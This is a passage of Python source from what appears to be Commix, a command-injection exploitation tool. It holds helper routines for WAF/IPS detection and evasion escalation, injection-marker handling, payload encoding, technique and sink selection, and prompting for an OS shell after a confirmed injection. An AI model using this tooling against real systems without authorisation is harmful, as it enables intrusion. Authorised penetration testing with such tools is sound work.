#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import io
import re
import os
import sys
import json
import time
import shlex
import socket
import random
import string
import base64
import importlib
import gzip
import zlib
import subprocess
import contextlib
import statistics
from glob import glob
from src.utils import common
from src.utils import logs
from src.core.parse import cmdline as menu
from src.utils import settings
from src.thirdparty.odict import OrderedDict
from src.core.convert import hexdecode
from src.core.requests import proxy
from src.core.requests import headers
from src.core.requests import requests
from src.core.requests import parameters
from src.core.requests import stability
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.six.moves import http_client as _http_client
from src.thirdparty.colorama import Style
from src.thirdparty.flatten_json.flatten_json import flatten, unflatten_list

try:
  if settings.PLATFORM == "mac":
    import readline
    if getattr(readline, '__doc__', '') is not None and 'libedit' in getattr(readline, '__doc__', ''):
      import gnureadline as readline
    from readline import *
  else:
    import readline
    from readline import *
except:
  try:
    import pyreadline as readline
    from pyreadline import *
  except:
    settings.READLINE_ERROR = True

"""
Exiting
"""
def exit():
  if settings.VERBOSITY_LEVEL != 0:
    settings.print_data_to_stdout(settings.execution("Ending"))
  os._exit(0)

"""
Persist a new WAF/IPS finding when possible; defer the import to avoid a circular dependency.
"""
def persist_waf_finding():
  if menu.options.ignore_session or not settings.TARGET_NETLOC:
    return
  from src.utils import session_handler
  session_handler.import_waf_status(settings.TARGET_NETLOC, True)

"""
Flags the target as WAF/IPS-protected on a block-like HTTP status code.
"""
def detect_waf(err_code):
  if str(err_code) in settings.WAF_BLOCK_HTTP_CODES and \
     not menu.options.skip_waf and \
     not settings.HOST_INJECTION:
    if not settings.WAF_ENABLED:
      warn_msg = "It seems some kind of WAF/IPS is protecting the target."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
      settings.WAF_ENABLED = True
      persist_waf_finding()
    else:
      # Already evading and still blocked, so what is in use is not enough.
      escalate_waf_evasion()
    return True
  return False

"""
Detection of WAF/IPS protection.
"""
def check_waf(url, http_request_method):
  payload = _urllib.parse.quote(settings.WAF_CHECK_PAYLOAD)
  info_msg = "Checking whether some kind of WAF/IPS is protecting the target."
  settings.print_data_to_stdout(settings.print_info_msg(info_msg))
  if settings.VERBOSITY_LEVEL >= 1:
    # Shown the way it was written, as every other payload is - what goes on the wire is encoded,
    # and that is what the traffic at '-v 2' shows.
    settings.print_data_to_stdout(settings.print_payload(settings.WAF_CHECK_PAYLOAD))
  payload = "".join(random.sample(string.ascii_uppercase, k=4)) + "=" + payload
  if not "?" in url:
    payload = "?" + payload
  else:
    payload = settings.POST_DATA_PARAM_DELIMITER + payload
  url = url + payload
  if settings.USER_DEFINED_POST_DATA:
    request = _urllib.request.Request(remove_tags(url), remove_tags(settings.USER_DEFINED_POST_DATA).encode(), method=http_request_method)
  else:
    request = _urllib.request.Request(remove_tags(url), method=http_request_method)
  headers.do_check(request)
  return request, url

"""
Check injection technique(s) status.
"""
def injection_techniques_status():
  if settings.CLASSIC_STATE != True and \
     settings.EVAL_BASED_STATE != True and \
     settings.TIME_BASED_STATE != True and \
     settings.FILE_BASED_STATE != True and \
     settings.TEMPFILE_BASED_STATE != True and \
     settings.OOB_STATE != True :
    return False
  else:
    return True

"""
Check for quoted values
"""
def quoted_value(value):
  return '"{}"'.format(value)

"""
Payload fixation
"""
def payload_fixation(payload):

  payload = _urllib.parse.unquote(payload)
  payload = _urllib.parse.quote(payload)
  return payload

"""
Get response output
"""
def get_response(output):
  request = _urllib.request.Request(output)
  headers.do_check(request)
  response = headers.check_http_traffic(request)
  if response is None:
    # Check if defined any HTTP Proxy (--proxy option).
    if menu.options.proxy or menu.options.ignore_proxy or menu.options.tor:
      response = proxy.use_proxy(request)
    else:
      response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
  return response

"""
Check for non custom parameters.
"""
def process_non_custom():
  if settings.CUSTOM_INJECTION_MARKER and not settings.SKIP_NON_CUSTOM_PARAMS:
    while True:
      message = "Other non-custom parameters found."
      message += " Do you want to process them too? [Y/n] "
      process = common.read_input(message, default="Y", check_batch=True)
      if process in settings.CHOICE_YES:
        settings.CUSTOM_INJECTION_MARKER = False
        settings.SKIP_NON_CUSTOM_PARAMS = settings.IGNORE_USER_DEFINED_POST_DATA = False
        return 
      elif process in settings.CHOICE_NO:
        settings.SKIP_NON_CUSTOM_PARAMS = True
        settings.IGNORE_USER_DEFINED_POST_DATA = False
        return 
      elif process in settings.CHOICE_QUIT:
        raise SystemExit()
      else:
        common.invalid_option(process)
        pass

"""
Process the defined injectable value
"""
def process_injectable_value(payload, data):
  if len(settings.TESTABLE_VALUE) == 0:
    settings.TESTABLE_VALUE = settings.SINGLE_WHITESPACE
  # Regenerate the tag if it overlaps the testable value.
  random_tag = settings.RANDOM_TAG
  while random_tag in settings.TESTABLE_VALUE or settings.TESTABLE_VALUE in random_tag:
    random_tag = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(10))
  _ = data.replace(settings.TESTABLE_VALUE, random_tag)
  if settings.TESTABLE_VALUE in _.replace(settings.INJECT_TAG, ""):
    return _.replace(settings.INJECT_TAG, "").replace(settings.TESTABLE_VALUE, payload).replace(random_tag, settings.TESTABLE_VALUE)
  else:
    return _.replace(random_tag + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload).replace(random_tag, settings.TESTABLE_VALUE)

"""
Remove all injection tags from provided data
"""
def remove_tags(data):
  if not data:
    data = ""
  return data.replace(settings.INJECT_TAG,"").replace(settings.CUSTOM_INJECTION_MARKER_CHAR,"").replace(settings.ASTERISK_MARKER, "").replace(settings.RANDOM_TAG, "") 

"""
Process data with custom injection marker character ('*')
"""
def process_custom_injection_data(data):
  if not isinstance(data, str):
    # Safely return empty string if input is not a valid string
    return ""

  if settings.CUSTOM_INJECTION_MARKER is not None:
    lines = []
    for line in data.split(settings.END_LINE.ESCAPED_LF):
      if not line.startswith(settings.ACCEPT) and settings.CUSTOM_INJECTION_MARKER_CHAR in line:
        if menu.options.test_parameter is not None and settings.CUSTOM_INJECTION_MARKER is False:
          line = remove_tags(line)
        line = line.replace(settings.CUSTOM_INJECTION_MARKER_CHAR, settings.ASTERISK_MARKER)
      lines.append(line)
    
    # Remove duplicates, then rejoin lines
    data = settings.END_LINE.ESCAPED_LF.join(list(dict.fromkeys(lines))).rstrip(settings.END_LINE.ESCAPED_LF)

  return data

"""
Check for custom injection marker character ('*').
"""
def custom_injection_marker_character(url, http_request_method):
  _ = settings.CUSTOM_INJECTION_MARKER = False
  settings.CUSTOM_INJECTION_MARKER_PARAMETERS_LIST = []
  
  if url and settings.CUSTOM_INJECTION_MARKER_CHAR in url:
    option = "'-u'"
    _ = settings.CUSTOM_INJECTION_MARKER = settings.INJECTION_MARKER_LOCATION.URL = True
  if menu.options.data and settings.CUSTOM_INJECTION_MARKER_CHAR in menu.options.data:
    option = str(http_request_method) + " body"
    _ = settings.CUSTOM_INJECTION_MARKER = settings.INJECTION_MARKER_LOCATION.DATA = True
  if not _:
    option = "option '--header(s)/--user-agent/--referer/--cookie'"
  # Whether the value carries the marker that says where a payload goes.
  def has_marker(value):
    return bool(value) and settings.CUSTOM_INJECTION_MARKER_CHAR in re.sub(settings.PROBLEMATIC_CUSTOM_INJECTION_PATTERNS, "", value)

  if has_marker(menu.options.cookie):
    settings.CUSTOM_INJECTION_MARKER = settings.COOKIE_INJECTION = settings.INJECTION_MARKER_LOCATION.COOKIE = True
  if has_marker(menu.options.agent):
    settings.CUSTOM_INJECTION_MARKER = settings.INJECTION_MARKER_LOCATION.HTTP_HEADERS = settings.USER_AGENT_INJECTION = True
  if has_marker(menu.options.referer):
    settings.CUSTOM_INJECTION_MARKER = settings.INJECTION_MARKER_LOCATION.HTTP_HEADERS = settings.REFERER_INJECTION = True
  if has_marker(menu.options.host):
    settings.CUSTOM_INJECTION_MARKER = settings.INJECTION_MARKER_LOCATION.HTTP_HEADERS = settings.HOST_INJECTION = True
  if has_marker(menu.options.header) or has_marker(menu.options.headers):
     settings.CUSTOM_INJECTION_MARKER = True
  if settings.CUSTOM_HEADER_CHECK and settings.CUSTOM_HEADER_CHECK != settings.ACCEPT:
    if settings.CUSTOM_HEADER_CHECK not in settings.TESTABLE_PARAMETERS_LIST:
      settings.CUSTOM_INJECTION_MARKER = True
    else:
      settings.CUSTOM_HEADER_INJECTION = True

  if settings.CUSTOM_INJECTION_MARKER:
    while True:
      message = "Custom injection marker ('" + settings.CUSTOM_INJECTION_MARKER_CHAR + "') found in " + option +". "
      message += "Do you want to process it? [Y/n] "
      procced_option = common.read_input(message, default="Y", check_batch=True)
      if procced_option in settings.CHOICE_YES:
        return True
      elif procced_option in settings.CHOICE_NO:
        return False
      elif procced_option in settings.CHOICE_QUIT:
        raise SystemExit()
      else:
        common.invalid_option(procced_option)
        pass

"""
Logging a debug message when a specific injection technique is being skipped.
"""
def skipping_technique(technique, injection_type, state):
  if settings.VERBOSITY_LEVEL != 0 and state != True:
    debug_msg = "Skipping the " + technique_label(injection_type, technique) + "."
    settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))

"""
Prompt the user to select a mobile User-Agent string.
"""
def mobile_user_agents():
  devices, default_index = common.load_mobile_user_agents()
  menu.mobile_user_agents(devices, default_index)

  while True:
    message = "Which smartphone do you want commix to imitate through HTTP User-Agent header? "
    mobile_user_agent = common.read_input(message, default=str(default_index + 1), check_batch=True)
    try:
      choice = int(mobile_user_agent)
      if choice in range(1, len(devices) + 1):
        return devices[choice - 1][1]
      else:
        common.invalid_option(mobile_user_agent)
    except ValueError:
      if mobile_user_agent.lower() == "q":
        raise SystemExit()
      else:
        common.invalid_option(mobile_user_agent)


"""
Run host OS command(s) when injection point is found.
"""
def alert():
  if settings.ALERT:
    info_msg = "Executing alerting shell command(s) '" + str(menu.options.alert) + "'."
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
    try:
      process = subprocess.Popen(menu.options.alert, shell=True)
      process.wait()
    except Exception:
      err_msg = "Error occurred while executing command(s) '" + str(menu.options.alert) + "'."
      settings.print_data_to_stdout(settings.print_error_msg(err_msg))

"""
Check for HTTP Method
"""
def check_http_method(url):
  if settings.CRAWLING and not settings.USER_DEFINED_POST_DATA:
    http_request_method = settings.HTTPMETHOD.GET
  elif menu.options.method:
    http_request_method = menu.options.method.upper()
  elif isinstance(url, str) and settings.INJECT_TAG in url:
    http_request_method = settings.HTTPMETHOD.GET
  else:
    if settings.COOKIE_INJECTION:
      http_request_method = settings.COOKIE
    if settings.USER_DEFINED_POST_DATA:
      http_request_method = settings.HTTPMETHOD.POST
    else:
      http_request_method = settings.HTTPMETHOD.GET
  return http_request_method

"""
True (having said so) when Metasploit isn't installed - every msfvenom-backed payload needs it.
"""
def metasploit_missing():
  if os.path.exists(settings.METASPLOIT_PATH):
    return False
  settings.print_data_to_stdout(settings.print_error_msg(settings.METASPLOIT_ERROR_MSG))
  return True

"""
Suggest '--os-shell', unless it is already in play. Held back rather than printed here: it is
advice about the next run, so it belongs with the last lines of this one and not in the middle of
the output of whatever the finding is being used for.
"""
def suggest_os_shell():
  if not menu.options.os_shell:
    settings.OS_SHELL_SUGGESTION_PENDING = True

"""
Print the held-back '--os-shell' suggestion, once, wherever the run ends.
"""
def flush_os_shell_suggestion():
  if not settings.OS_SHELL_SUGGESTION_PENDING:
    return
  settings.OS_SHELL_SUGGESTION_PENDING = False
  info_msg = "Re-run with the '--os-shell' switch to access a command shell."
  settings.print_data_to_stdout(settings.print_info_msg(info_msg))

"""
What every target is owed once it is done with, whether or not the run ends here: the out-of-band
channel is closed and the file left for the command output is offered for deletion. Separate from
quit(), which always raises - so with several targets this never used to be reached at all.
"""
def finish_target():
  close_oob_channel()
  for cleanup_fn in list(settings.PENDING_FILE_CLEANUPS.values()):
    cleanup_fn()
  settings.PENDING_FILE_CLEANUPS.clear()
  if settings.LEFTOVER_FILES:
    info_msg = "Files left behind: " + ", ".join(settings.LEFTOVER_FILES) + "."
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
    del settings.LEFTOVER_FILES[:]

"""
Technique letters written out, optionally saying how each one shows execution. Used to name what a
run did not look at, and which techniques can reach a sink at all.
"""
def technique_names(letters, qualified=False):
  plain = {"c": "classic", "t": "time-based", "f": "file-based"}
  # How execution shows is worth spelling out where the point is which techniques exist at all.
  shows = {"c": "results-based", "t": "blind", "f": "semi-blind"}
  chosen = [plain[_] + (" (" + shows[_] + ")" if qualified else "") for _ in ("c", "t", "f") if _ in letters]
  if not chosen:
    return ""
  name = chosen[0] if len(chosen) == 1 else ", ".join(chosen[:-1]) + " and " + chosen[-1]
  return name + " technique" + "s"[len(chosen) == 1:]

# The techniques this run was told to leave out, named for the message that says so.
def untested_techniques():
  return technique_names([_ for _ in ("c", "t", "f") if _ not in menu.options.tech])

"""
The payload builder the time-based technique uses: the same technique reaches either sink, and what
differs is only what the payload is written in - shell for a command, the language for an evaluation.
"""
def time_based_payloads():
  if menu.options.eval_sink:
    from src.core.eval.payloads import time_based as payloads
  else:
    from src.core.techniques.time_based import tb_payloads as payloads
  return payloads

"""
The payload builder the file-based technique uses, chosen the same way: the file it writes and reads
back is the technique's, and the sink only decides how the command that fills it is reached.
"""
def file_based_payloads():
  if menu.options.eval_sink:
    from src.core.eval.payloads import file_based as payloads
  else:
    from src.core.techniques.file_based import fb_payloads as payloads
  return payloads

"""
The payload builder the tempfile-based technique uses, chosen the same way: the file it writes and
then reads back a byte at a time is the technique's, and the sink only decides how the command that
fills it is reached, and in whose language the reading is asked for.
"""
def tempfile_based_payloads():
  if menu.options.eval_sink:
    from src.core.eval.payloads import tempfile_based as payloads
  else:
    from src.core.techniques.tempfile_based import tfb_payloads as payloads
  return payloads

"""
The prefixes an evaluation sink is reached through, the language's own execution functions included.

Built fresh every time rather than by rewriting the lists: this is asked for once per parameter, and
wrapping in place would wrap what the last parameter already wrapped.
"""
def eval_prefixes():
  prefixes = list(settings.EVAL_PREFIXES)
  for function in settings.EXECUTION_FUNCTIONS:
    # How a function is reached is the language's own spelling, not something to assume here.
    candidate = settings.EVAL_GRAMMAR.execution_prefix(function)
    if candidate not in prefixes:
      prefixes.append(candidate)
  return prefixes

"""
The boundaries a payload is wrapped in: what breaks into a shell command is not what breaks into a
string the target evaluates, so the sink chooses them rather than the technique.
"""
def sink_boundaries():
  if menu.options.eval_sink:
    return settings.EVAL_PREFIXES, settings.EVAL_SUFFIXES, settings.EVAL_SEPARATORS
  return settings.PREFIXES, settings.SUFFIXES, settings.SEPARATORS

"""
Whether a technique is one this run is testing. Two separate choices sit behind it: which sink is
being tested, chosen with '--eval', and by which technique, chosen with '--technique'. A technique
runs when its letter was asked for and it reaches the sink in hand, so the two compose - and the
out-of-band technique answers to the letter alone, carrying whichever sink it is given.
"""
def technique_selected(tech_letter, eval_sink=False):
  # The out-of-band technique carries whichever sink it is given, so it answers to the letter alone.
  if tech_letter != settings.OOB_TECHNIQUE_LETTER and bool(menu.options.eval_sink) != bool(eval_sink):
    return False
  return len(menu.options.tech) == 0 or tech_letter in menu.options.tech

"""
Quit - hard_exit ends the process immediately (os._exit), otherwise SystemExit unwinds normally.
"""
def quit(filename, url, hard_exit):
  if settings.CONFIRMED_INJECTION_POINTS:
    confirmed_injection_points_summary()
    suggest_os_shell()
    settings.CONFIRMED_INJECTION_POINTS = []
  # Post-detection actions run once, after detection finishes.
  for action_fn in list(settings.PENDING_POST_DETECTION_ACTIONS):
    action_fn()
  settings.PENDING_POST_DETECTION_ACTIONS = []
  # Recurses into quit() when the shell exits; the rest runs there.
  if settings.PENDING_OS_SHELL_ENTRY:
    entry = settings.PENDING_OS_SHELL_ENTRY
    settings.PENDING_OS_SHELL_ENTRY = None
    entry()
  finish_target()
  if settings.LOAD_SESSION and not settings.LOGS_NOTIFICATION_SHOWN:
    settings.LOGS_NOTIFICATION_SHOWN = True
    logs.logs_notification(filename)
  logs.print_logs_notification(filename, url)
  common.show_http_error_codes()
  if hard_exit:
    raise exit()
  else:
    raise SystemExit()

"""
User aborted procedure
"""
def user_aborted(filename, url):
  settings.clear_current_line()
  save_cmd_history()
  abort_msg = "User aborted procedure "
  abort_msg += "during the " + assessment_phase()
  abort_msg += " phase (Ctrl-C pressed)."
  settings.print_data_to_stdout(settings.print_abort_msg(abort_msg))
  if settings.LOAD_SESSION and not settings.LOGS_NOTIFICATION_SHOWN:
    settings.LOGS_NOTIFICATION_SHOWN = True
    logs.logs_notification(filename)
  logs.print_logs_notification(filename, url)
  common.show_http_error_codes()
  raise exit()

"""
Prompts for and applies a new verbosity level (0-4) - used by the Ctrl-C menus.
"""
def change_verbosity():
  msg = "Enter new verbosity level (0-4) [current: " + str(settings.VERBOSITY_LEVEL) + "] "
  # Ctrl-C is itself an explicit request for attention - always prompt for
  # real input here, even under --batch.
  choice = common.read_input(msg, default=str(settings.VERBOSITY_LEVEL), check_batch=False)
  try:
    level = int(choice or settings.VERBOSITY_LEVEL)
  except ValueError:
    level = None
  if level is not None and 0 <= level <= 4:
    settings.VERBOSITY_LEVEL = level
    menu.options.verbose = level
    info_msg = "Verbosity level set to " + str(level) + "."
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
  else:
    warn_msg = "Invalid verbosity level - keeping the current value (" + str(settings.VERBOSITY_LEVEL) + ")."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
Ctrl-C during detection - ask how to proceed instead of aborting outright.
"""
def handle_detection_interrupt(filename, url):
  settings.clear_current_line()
  if settings.MULTI_TARGETS:
    msg = "How do you want to proceed? [(C)ontinue/ne(X)t target/(S)kip current technique/(e)nd detection phase/(n)ext parameter/(v)erbosity/(q)uit] "
    valid_choices = ("c", "x", "s", "e", "n", "v", "q")
  else:
    msg = "How do you want to proceed? [(C)ontinue/(S)kip current technique/(e)nd detection phase/(n)ext parameter/(v)erbosity/(q)uit] "
    valid_choices = ("c", "s", "e", "n", "v", "q")
  default = "C"
  choice = "q"
  try:
    while True:
      # Ctrl-C is itself an explicit request for attention - always prompt, even under --batch.
      choice = (common.read_input(msg, default=default, check_batch=False) or default).strip().lower()
      if choice in valid_choices:
        break
      common.invalid_option(choice)
  except KeyboardInterrupt:
    settings.clear_current_line()
    choice = "q"
  if choice == "c":
    raise settings.RetryTechniqueException()
  elif choice == "v":
    change_verbosity()
    raise settings.RetryTechniqueException()
  elif choice == "x":
    raise settings.NextTargetException()
  elif choice == "e":
    raise settings.EndDetectionPhaseException()
  elif choice == "n":
    raise settings.NextParameterException()
  elif choice == "q":
    user_aborted(filename, url)
  else:
    # "s" - move on to the next technique.
    raise settings.SkipTechniqueException()

"""
Ctrl-C outside the per-test loop (heuristics, WAF check, identification) -
too coarse to resume one specific test, so just offer to move on or quit.
"""
def handle_early_interrupt(filename, url):
  if not settings.MULTI_TARGETS:
    user_aborted(filename, url)
  settings.clear_current_line()
  msg = "How do you want to proceed? [ne(X)t target/(v)erbosity/(q)uit] "
  choice = "q"
  try:
    while True:
      # Ctrl-C is itself an explicit request for attention - always prompt, even under --batch.
      choice = (common.read_input(msg, default="X", check_batch=False) or "X").strip().lower()
      if choice in ("x", "v", "q"):
        break
      common.invalid_option(choice)
  except KeyboardInterrupt:
    settings.clear_current_line()
    choice = "q"
  if choice == "v":
    # No further prompting - changing verbosity just continues (next target).
    change_verbosity()
    return
  if choice == "q":
    user_aborted(filename, url)

"""
Ctrl-C during exploitation (shell, calibration, enumeration) - a vulnerability
is already confirmed, so the only real choice is whether to keep going.
"""
def handle_exploitation_interrupt(filename, url):
  settings.clear_current_line()
  # "v" here, not "c" - "C" is already taken by "Continue" in this menu.
  msg = "How do you want to proceed? [(C)ontinue/(v)erbosity/(q)uit] "
  choice = "q"
  try:
    while True:
      # Ctrl-C is itself an explicit request for attention - always prompt, even under --batch.
      choice = (common.read_input(msg, default="C", check_batch=False) or "C").strip().lower()
      if choice in ("c", "v", "q"):
        break
      common.invalid_option(choice)
  except KeyboardInterrupt:
    settings.clear_current_line()
    choice = "q"
  if choice == "v":
    # No further prompting - changing verbosity just continues.
    change_verbosity()
    return
  if choice == "q":
    user_aborted(filename, url)

"""
Connection exceptions
"""
def connection_exceptions(err_msg):
  requests.request_failed(err_msg)
  with settings.REQUESTS_LOCK:
    settings.TOTAL_OF_REQUESTS = settings.TOTAL_OF_REQUESTS + 1
  if settings.MAX_RETRIES > 1:
    delay = stability.retry_delay_seconds()
    if delay:
      time.sleep(delay)
    if not any((settings.MULTI_TARGETS, settings.CRAWLING,settings.REVERSE_TCP,settings.BIND_TCP)):
      warn_msg = "Connection error (" + str(err_msg) + "), retrying request (" + str(settings.TOTAL_OF_REQUESTS) + "/" + str(settings.MAX_RETRIES) + ")."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
      settings.VISIBLE_CONNECTION_ERRORS += 1
  if not settings.VALID_URL :
    if stability.should_abandon_target():
      raise SystemExit()

"""
Tab Autocompleter
"""
def tab_autocompleter():
  try:
    # MacOSX tab compliter
    if 'libedit' in readline.__doc__:
      readline.parse_and_bind("bind ^I rl_complete")
    else:
      readline.parse_and_bind("tab: complete")
    readline.set_completer_delims(" \t\n")
    # Tab compliter
    readline.set_completer(menu.tab_completer)
  except (TypeError, AttributeError):
    error_msg = "Failed to initialize tab completion with the platform's readline library."
    settings.print_data_to_stdout(settings.print_error_msg(error_msg))

"""
Load commands from history.
"""
def load_cmd_history():
  try:
    cli_history = settings.CLI_HISTORY
    # An empty file holds no history to load, and holds no header for the platform's own history
    # format either - so reading it fails where there was never anything to read.
    if os.path.isfile(cli_history) and os.path.getsize(cli_history):
      readline.read_history_file(cli_history)
  except (IOError, OSError, AttributeError, UnicodeError):
    if settings.VERBOSITY_LEVEL != 0:
      warn_msg = "There was a problem loading the history file '" + cli_history + "'."
      if settings.IS_WINDOWS:
        warn_msg += " See 'https://github.com/pyreadline/pyreadline/issues/30' for more info."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
Save command history.
"""
def save_cmd_history():
  cli_history = settings.CLI_HISTORY
  try:
    # Written whether or not the file is already there: writing it is what creates it - though the
    # directory it goes in is ours to make, and a run that ends early may not have needed it yet.
    if cli_history and readline.get_current_history_length():
      directory = os.path.dirname(cli_history)
      if directory and not os.path.isdir(directory):
        os.makedirs(directory, exist_ok=True)
      readline.set_history_length(settings.MAX_HISTORY_LENGTH)
      readline.write_history_file(cli_history)
  except (IOError, OSError, AttributeError):
    # Every path out of a run saves it, so the same failure would otherwise be reported twice.
    if settings.FAILED_HISTORY_FILE != cli_history:
      settings.FAILED_HISTORY_FILE = cli_history
      warn_msg = "Unable to write the history file '" + cli_history + "'."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
Testing technique (title)
"""
def testing_technique_title(injection_type, technique):
  # A new technique's title - the completion label below is free to print again for it.
  settings.LAST_COMPLETED_TECHNIQUE = None
  settings.LAST_DOT_BUCKET = -1
  technique = technique_label(injection_type, technique)
  announced = (settings.CHECKING_PARAMETER, technique)
  title = "Continuing with the " if settings.LAST_ANNOUNCED_TECHNIQUE == announced else "Testing the "
  settings.LAST_ANNOUNCED_TECHNIQUE = announced
  if settings.VERBOSITY_LEVEL != 0:
    info_msg = title + technique + ". "
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
  else:
    # Close a previous technique's dangling "... (done)" line first.
    settings.clear_current_line()
    info_msg = title + technique + ", please wait..."
    settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(info_msg))

"""
Injection progress - a "." as testing advances, " (done)" once the technique is finished.
"""
def injection_process(injection_type, technique, done=False, i=None, total=None):
  if settings.VERBOSITY_LEVEL != 0:
    return
  if not settings.PROGRESS_LINE_OPEN:
    testing_technique_title(injection_type, technique)
  if done:
    # Can be hit once per false-positive retry on the same technique - only print once.
    if settings.LAST_COMPLETED_TECHNIQUE == technique:
      return
    settings.LAST_COMPLETED_TECHNIQUE = technique
    settings.print_data_to_stdout(" (done)")
    return
  # One dot per combination can get unreadably long - only cross a 4%-wide bucket.
  if total:
    bucket = int(((i * 100) / total) // 4)
    if bucket == settings.LAST_DOT_BUCKET:
      return
    settings.LAST_DOT_BUCKET = bucket
  settings.print_data_to_stdout(".")

"""
Check value inside boundaries.
"""
def value_inside_boundaries(parameter, http_request_method):
  try:
    if isinstance(parameter, str):
      value_inside_boundaries = re.search(r"=" + settings.VALUE_BOUNDARIES, parameter).group()
      if value_inside_boundaries:
        pcre_mod_value = value_inside_boundaries + settings.PCRE_MODIFIER[1:2]
        if pcre_mod_value not in parameter:
          while True:
            message = "It appears that provided value '" + value_inside_boundaries + "' has boundaries."
            message += " Do you want to add the PCRE '" + settings.PCRE_MODIFIER + "'"
            message += " modifier outside boundaries? ('" + pcre_mod_value + "') [Y/n] "
            modifier_check = common.read_input(message, default="Y", check_batch=True)
            if modifier_check in settings.CHOICE_YES:
              parameter = parameter.replace(value_inside_boundaries, pcre_mod_value)
              value_inside_boundaries = pcre_mod_value
              break
            elif modifier_check in settings.CHOICE_NO:
              break
            elif modifier_check in settings.CHOICE_QUIT:
              raise SystemExit()
            else:
              common.invalid_option(modifier_check)
              pass

        value = re.search(settings.VALUE_BOUNDARIES, value_inside_boundaries).group(1)
        if value:
          value = value_inside_boundaries.replace(value, value + settings.CUSTOM_INJECTION_MARKER_CHAR)
          while True:
            message = "Do you want to inject the provided value '" + value + "' inside boundaries?"
            message += " ('" + value + "') [Y/n] "
            procced_option = common.read_input(message, default="Y", check_batch=True)
            if procced_option in settings.CHOICE_YES:
              parameter = parameter.replace(value_inside_boundaries, value)
              break
            elif procced_option in settings.CHOICE_NO:
              break
            elif procced_option in settings.CHOICE_QUIT:
              raise SystemExit()
            else:
              common.invalid_option(procced_option)
              pass
  except Exception:
    pass

  return parameter

"""
Ignoring the anti-CSRF parameter(s).
"""
def explicitly_testable(parameter):
  # Asking for a parameter by name is asking for it to be tested, whatever it is called.
  name = parameter.split("=")[0].strip().lower()
  return any(name == _.split("=")[0].strip().lower() for _ in settings.TESTABLE_PARAMETERS_LIST)

# Whether a parameter looks like an anti-CSRF token, which testing would only invalidate.
def ignore_anticsrf_parameter(parameter):
  if any(parameter.lower().count(token) for token in settings.CSRF_TOKEN_PARAMETER_INFIXES):
    if not explicitly_testable(parameter):
      if (len(parameter.split("="))) == 2:
        info_msg = "Ignoring the parameter '" + parameter.split("=")[0]
        info_msg += "' that appears to hold anti-CSRF token '" + parameter.split("=")[1] +  "'."
        settings.print_data_to_stdout(settings.print_info_msg(info_msg))
      return True

"""
Ignoring the parameter(s) carrying session or framework state.
"""
def ignore_stateful_parameter(parameter):
  name = parameter.split("=")[0].strip()
  if name.upper() in settings.IGNORE_PARAMETERS and not explicitly_testable(parameter):
    info_msg = "Ignoring the parameter '" + name + "' that appears to hold session or framework state."
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
    return True

"""
Adapt newline characters in the payload depending on injection settings and OS.
"""
def sanitize_payload_newlines(payload):
  if (
    settings.USER_AGENT_INJECTION
    or settings.REFERER_INJECTION
    or settings.HOST_INJECTION
    or settings.CUSTOM_HEADER_INJECTION
  ):
    return payload.replace(settings.END_LINE.LF, ";")

  """
  Nothing else is rewritten.

  A newline inside a payload is written as the character it is meant to be - an interpreter's own
  line break is a carriage return where it is one - so there is nothing left here to correct, and a
  separator that is itself a newline must not be turned into something else.
  """
  return payload

"""
Normalize newline sequences (CRLF, CR, LF) into lowercase URL-encoded form.
"""
def normalize_newlines(payload):
  """
  A header value cannot carry a line break - one would end the header, or be refused outright - so
  any that the payload holds are written out in their encoded form instead.

  Only those. The payload used to be decoded whole first, which was needed while it arrived
  part-encoded and is now only a way to damage a command that contains a per-cent sign.
  """
  for seq in [settings.END_LINE.CRLF, settings.END_LINE.CR, settings.END_LINE.LF]:
    payload = payload.replace(seq, _urllib.parse.quote(seq).lower())

  return payload

"""
Process HTTP response content: handle decompression and encode/decode page content.
"""
def process_page_content(response, action):
  try:
    page = response.read()
  except _http_client.IncompleteRead as err_msg:
    requests.request_failed(err_msg)
    page = err_msg.partial

  # Handle compressed content
  content_encoding = response.info().get('Content-Encoding')
  try:
    response.close()
  except Exception:
    pass
  if content_encoding in ("gzip", "x-gzip", "deflate"):
    try:
      if content_encoding == 'deflate':
        # zlib decompression; -15 for raw deflate
        page = zlib.decompress(page, -15)
      else:  # gzip / x-gzip
        with contextlib.closing(gzip.GzipFile(fileobj=io.BytesIO(page), mode='rb')) as gz:
          page = gz.read()
    except (zlib.error, OSError, EOFError):
      # Only catch relevant decompression errors
      warn_msg = "Page decompression failed, turning off page compression."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

  # Encode or decode page content, in what the page said it is written in - unless the user named
  # a codec of their own with '--codec', which outranks whatever the page declares.
  chosen = settings.DEFAULT_CODEC if menu.options.codec else (settings.DEFAULT_PAGE_ENCODING or settings.DEFAULT_CODEC)
  error_occurred = False
  err_msg = ""
  """
  What the page declares is a claim, and a claim can be wrong.

  The codec commix was configured with is not a claim, so a failure there is worth stopping for -
  but a page that names an encoding it does not honour is the target's mistake, and reading it the
  configured way is a better answer than abandoning the run over it.
  """
  for codec in (chosen, settings.DEFAULT_CODEC):
    try:
      if action == "encode" and isinstance(page, str):
        return page.encode(codec, errors="replace")
      else:
        return page.decode(codec, errors="replace")
    except (UnicodeEncodeError, UnicodeDecodeError) as err:
      err_msg = "The " + str(err).split(":")[0] + ". "
    except (LookupError, TypeError) as err:
